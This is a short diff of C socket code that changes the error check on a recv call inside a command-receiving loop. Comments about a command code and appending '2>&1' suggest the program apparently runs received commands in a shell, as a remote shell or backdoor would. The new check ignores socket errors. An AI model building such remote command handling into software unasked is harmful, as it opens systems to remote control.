@@ -169,7 +169,7 @@ int main(void) {
 				// BUFLEN + 1 + 4, for null byte and "2>&1" string concatenation
 				char buf[BUFLEN + 5] = { 0 };
 
-				if (recv(connect_socket, buf, BUFLEN, 0) == SOCKET_ERROR)
+				if (!recv(connect_socket, buf, BUFLEN, 0))
 					break;
 
 				// buf[0] is the command code and &buf[1] is the parsed data.
